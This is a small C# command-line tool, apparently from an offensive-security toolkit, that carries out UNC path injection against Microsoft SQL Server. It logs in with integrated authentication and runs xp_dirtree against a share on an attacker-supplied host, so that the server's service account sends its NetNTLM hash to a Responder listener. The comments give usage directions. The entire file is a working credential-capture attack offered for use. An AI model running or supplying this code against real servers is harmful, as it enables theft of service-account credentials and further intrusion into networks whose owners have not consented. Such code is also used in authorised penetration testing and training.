using System;
using System.Data.SqlClient;

// UNC Path Injection to capture NetNTLM hash (Just use Responder!)
// Usage: sqlUNC.exe -h <sqlServer> -d master -t <responderIP>

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "";
            String database = "master";
            String target = "";

            for (var i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h") { sqlServer = args[i + 1]; }
                else if (args[i] == "-d") { database = args[i + 1]; }
                else if (args[i] == "-t") { target = args[i + 1]; }
            }

            if (sqlServer == "")
            {
                Console.WriteLine("Please specify a host with -h <host>");
                Environment.Exit(0);
            }

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\" + target + "\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}